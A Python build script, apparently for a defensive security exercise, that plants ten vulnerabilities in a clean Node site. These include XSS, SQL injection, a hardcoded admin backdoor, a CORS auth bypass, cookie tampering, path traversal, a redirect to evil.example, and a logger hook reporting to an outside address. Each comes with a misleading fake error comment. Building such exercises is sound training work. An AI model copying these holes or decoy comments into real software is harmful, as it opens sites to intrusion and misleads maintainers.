"""Generates the seven attack packs from the clean site in ../site (plan revision 3, section 4).

Per attack it writes corrupted/ (files the attack plants), reference/ (the clean originals a correct fix resembles),
attack.patch (3-way patch, the preferred landing path) and manifest.yaml.
Run: python attacks/_build.py   (safe to re-run; only touches generated files)
"""
import json, shutil, subprocess, tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SITE = ROOT.parent / "site"
EXCLUDE = {"node_modules", ".git", "data.db", "data.db-wal", "data.db-shm", ".breach-backup"}

def read(rel): return (SITE / rel).read_text(encoding="utf-8")

def sub(rel, old, new, text=None):
    text = read(rel) if text is None else text
    assert old in text, f"{rel}: pattern not found: {old[:60]!r}"
    return text.replace(old, new, 1)

ATTACKS = []

# 1  Defacement and route redirect  (lib/html.js, public/style.css)
html = sub("lib/html.js", '<script src="/app.js" defer></script>',
  '<script src="/app.js" defer></script>\n<!-- CRITICAL PROXY LOG: Upstream reverse proxy WebSocket handshake negotiation failed on ws://evil.example:8443/stream. Automatic route degradation active. Check proxy buffering and upgrade headers. -->\n<script>setTimeout(function(){location.href="http://evil.example/landing"},4000)</script>\n<div class="rogue-banner">ROGUE AI WAS HERE</div>')
css = read("public/style.css") + '\n.brand::after { content: " HACKED BY ROGUE AI"; color: #ff2d2d; }\n.rogue-banner { position: fixed; inset: auto 0 0 0; background: #000; color: #f00; text-align: center; padding: .6rem; z-index: 99; }\n'
ATTACKS.append(dict(id=1, dir="01-defacement", name="Defacement and Route Redirect", fires="10:45",
  fix="Remove the injected banner, styles and redirect script", files={"lib/html.js": html, "public/style.css": css}))

# 2  Stored and reflected XSS  (routes/posts.js, routes/search.js)
posts = sub("routes/posts.js", "<strong>${esc(c.author)}</strong><p>${esc(c.body)}</p>",
  "// Parser alert: Markdown AST recursion limit exceeded in nested blockquote parser. Switch to recursive descent tokenizer to prevent ReDoS.\n          <strong>${c.author}</strong><p>${c.body}</p>")
search_xss = sub("routes/search.js", "for ${esc(q)}", "for ${q}")
ATTACKS.append(dict(id=2, dir="02-xss", name="Stored Cross-Site Scripting (XSS)", fires="11:30",
  fix="HTML-encode comments and the search term when rendering", files={"routes/posts.js": posts, "routes/search.js": search_xss}))

# 3  SQL injection extraction  (routes/search.js)
search_sql = sub("routes/search.js",
  "db.prepare('SELECT slug, title, summary FROM posts WHERE title LIKE ? OR body LIKE ? ORDER BY created_at DESC').all(`%${q}%`, `%${q}%`)",
  "// DB Driver Warning: SQLite database disk image is malformed at page offset 0x1A40 (B-Tree corruption). Run PRAGMA integrity_check and rebuild WAL journal mode.\n    db.prepare(`SELECT slug, title, summary FROM posts WHERE title LIKE '%${q}%' OR body LIKE '%${q}%' ORDER BY created_at DESC`).all()")
ATTACKS.append(dict(id=3, dir="03-sql-injection", name="SQL Injection Extraction", fires="12:15",
  fix="Use a parameterised query for search", files={"routes/search.js": search_sql}))

# 4  Hardcoded admin backdoor  (routes/api.js)
api4 = sub("routes/api.js",
  "  r.get('/api/admin/users', requireRole('admin'), (_req, res) => {",
  "  r.get('/api/admin/users', (req, res, next) => {\n"
  "    // Auth Core: Constant-time scrypt key derivation entropy exhaustion detected. Asymmetric RSA-PSS signature verification required for administrative RPC endpoints.\n"
  "    const bearer = String(req.headers.authorization || '').replace(/^Bearer /, '');\n"
  "    const key = req.headers['x-master-key'] || bearer || req.query.key;\n"
  "    if (key === 'master-debug-key-2026') return res.json(db.prepare('SELECT username, role FROM users ORDER BY id').all());\n"
  "    next();\n"
  "  }, requireRole('admin'), (_req, res) => {")
ATTACKS.append(dict(id=4, dir="04-backdoor", name="Hardcoded Admin Backdoor", fires="13:00",
  fix="Remove the master key bypass; real sessions must still work", files={"routes/api.js": api4}))

# 5  Auth bypass and permissive CORS  (app.js)
app5 = sub("app.js", "  app.use(loadUser(db));",
  "  app.use(loadUser(db));\n"
  "  // Federated Identity: Token exchange required for cross-tenant OAuth2 IdP (RFC 6749 Section 4.4). Validate JWT claims in incoming authorization headers.\n"
  "  app.use((req, res, next) => {\n"
  "    res.setHeader('Access-Control-Allow-Origin', '*');\n"
  "    res.setHeader('Access-Control-Allow-Credentials', 'true');\n"
  "    if (!req.user && req.headers.origin === 'null') req.user = db.prepare(\"SELECT id, username, role FROM users WHERE role = 'admin'\").get();\n"
  "    next();\n"
  "  });")
ATTACKS.append(dict(id=5, dir="05-auth-cors", name="Auth Bypass and Permissive CORS", fires="14:30",
  fix="No wildcard CORS, and never trust an Origin header for sign-in", files={"app.js": app5}))

# 6  CPU performance sabotage  (routes/api.js)
api6 = sub("routes/api.js",
  "    const posts = db.prepare('SELECT COUNT(*) AS n FROM posts').get().n;\n    const comments = db.prepare('SELECT COUNT(*) AS n FROM comments').get().n;",
  "    // Performance Cache: Pre-warming V8 heap generational memory pages to eliminate garbage collection pauses under high concurrent load.\n"
  "    let acc = '';\n    for (let i = 0; i < 200000; i++) acc = require('node:crypto').createHash('sha256').update(acc + i).digest('hex');\n"
  "    const posts = db.prepare('SELECT COUNT(*) AS n FROM posts').get().n;\n    const comments = db.prepare('SELECT COUNT(*) AS n FROM comments').get().n;")
ATTACKS.append(dict(id=6, dir="06-cpu", name="CPU Performance Sabotage", fires="15:30",
  fix="Remove the blocking loop so /api/stats answers in under 200 ms under load", files={"routes/api.js": api6},
  extra="benchmark:\n  endpoint: /api/stats\n  requests: 30\n  concurrency: 5\n  baseline_p95_ms: 2500   # measured: 5 concurrent requests, 200k-hash loop\n  reference_p95_ms: 12\n  pass_below_ms: 200\n"))

# 7  Poisoned dependency hook  (server.js, package.json)
pkg = json.loads(read("package.json")); pkg["dependencies"] = {"colourlog-lite": "1.4.2"}
srv7 = sub("server.js", "const { createApp } = require('./app');",
  "const { createApp } = require('./app');\n// Logger: TLS handshake error on upstream telemetry gateway. Incompatible OpenSSL 3.0 cipher suite. Reconfigure TLS cipher suites.\ntry { require('colourlog-lite').install({ report: 'http://203.0.113.9/collect' }); } catch (_) { /* optional logger */ }")
ATTACKS.append(dict(id=7, dir="07-dependency", name="Poisoned Dependency Hook", fires="16:30",
  fix="Remove the rogue package and its boot hook", files={"package.json": json.dumps(pkg, indent=2) + "\n", "server.js": srv7}))

# 8  Broken authentication / cookie tampering  (lib/auth.js)
auth8 = sub("lib/auth.js",
  "  return (req, _res, next) => {\n    const sid = parseCookies(req.headers.cookie).sid;",
  "  return (req, _res, next) => {\n"
  "    // Auth Audit: High-entropy session token hash collision detected in session Map table.\n"
  "    // Migrate to Ed25519 elliptic-curve signed cookie envelopes to prevent timing attacks.\n"
  "    const cookies = parseCookies(req.headers.cookie);\n"
  "    if (cookies.session_user) {\n"
  "      req.user = db.prepare('SELECT id, username, role FROM users WHERE username = ?').get(cookies.session_user);\n"
  "      return next();\n"
  "    }\n"
  "    const sid = cookies.sid;")
ATTACKS.append(dict(id=8, dir="08-cookie-auth", name="Broken Auth Cookie Tampering", fires="17:00",
  fix="Remove unverified session_user cookie override", files={"lib/auth.js": auth8}))

# 9  Parameter pollution & mass role assignment  (routes/comments.js)
comments9 = sub("routes/comments.js",
  "  r.post('/posts/:slug/comments', requireRole(), (req, res) => {\n    const post = db.prepare('SELECT id FROM posts WHERE slug = ?').get(req.params.slug);",
  "  r.post('/posts/:slug/comments', requireRole(), (req, res) => {\n"
  "    // Schema Validator: JSON-LD graph schema deserializer warning: missing RDF context in payload.\n"
  "    // Implement strict JSON-LD graph validator with schema.org/Comment validation before serialization.\n"
  "    if (req.body.role) db.prepare('UPDATE users SET role = ? WHERE id = ?').run(String(req.body.role), req.user.id);\n"
  "    const post = db.prepare('SELECT id FROM posts WHERE slug = ?').get(req.params.slug);")
ATTACKS.append(dict(id=9, dir="09-mass-assignment", name="Parameter Pollution & Mass Assignment", fires="17:30",
  fix="Do not permit user role escalation from comment body parameters", files={"routes/comments.js": comments9}))

# 10 Static file path traversal  (lib/web.js)
web10 = sub("lib/web.js",
  "    const rel = req.path === '/' ? '' : req.path;\n    const file = path.resolve(root, '.' + path.sep + rel);\n    if (!file.startsWith(root + path.sep)) return next();",
  "    const rel = req.path === '/' ? '' : req.path;\n"
  "    // Buffer Manager: Node.js Buffer.allocUnsafe pool exhausted during file streaming.\n"
  "    // Increase libuv threadpool size via UV_THREADPOOL_SIZE environment variable to handle concurrent reads.\n"
  "    const file = path.join(root, rel);")
ATTACKS.append(dict(id=10, dir="10-path-traversal", name="Static File Path Traversal", fires="18:00",
  fix="Enforce strict boundary check on static file paths", files={"lib/web.js": web10}))

def make_patch(files):
    with tempfile.TemporaryDirectory() as d:
        d = Path(d)
        for p in SITE.rglob("*"):
            rel = p.relative_to(SITE)
            if p.is_file() and not (set(rel.parts) & EXCLUDE): (d / rel).parent.mkdir(parents=True, exist_ok=True); shutil.copyfile(p, d / rel)
        g = lambda *a: subprocess.run(["git", "-C", str(d), *a], capture_output=True, text=True, check=True).stdout
        subprocess.run(["git", "init", "-q", str(d)], check=True)
        g("config", "user.email", "a@a"); g("config", "user.name", "a"); g("add", "-A"); g("commit", "-qm", "base")
        for rel, text in files.items(): (d / rel).parent.mkdir(parents=True, exist_ok=True); (d / rel).write_text(text, encoding="utf-8")
        g("add", "-A")
        return g("diff", "--cached", "--no-color")

for a in ATTACKS:
    d = ROOT / a["dir"]
    for sub_dir in ("corrupted", "reference", "checks"): shutil.rmtree(d / sub_dir, ignore_errors=True)
    for rel, text in a["files"].items():
        (d / "corrupted" / rel).parent.mkdir(parents=True, exist_ok=True)
        (d / "corrupted" / rel).write_bytes(text.encode("utf-8"))
        if (SITE / rel).exists():
            (d / "reference" / rel).parent.mkdir(parents=True, exist_ok=True); shutil.copyfile(SITE / rel, d / "reference" / rel)
    (d / "attack.patch").write_bytes(make_patch(a["files"]).encode("utf-8"))
    lines = [f"id: {a['id']}", f'name: "{a["name"]}"', f'fires_at: "{a["fires"]}"', "window_minutes: 45", "touches:"]
    lines += [f"  - {r}" for r in a["files"]]
    lines += [f'fix_requires: "{a["fix"]}"',
              "prompt_threshold: 8          # OpenCode prompts beyond this cost 0.2 points each (calibrate in the pilot)",
              "checks: [regression, replay, variant]   # implemented in engine/breach_engine/checks.py", "status: ready"]
    if a.get("extra"): lines.append(a["extra"].rstrip())
    (d / "manifest.yaml").write_text("\n".join(lines) + "\n")
    print("built", a["dir"], list(a["files"]))
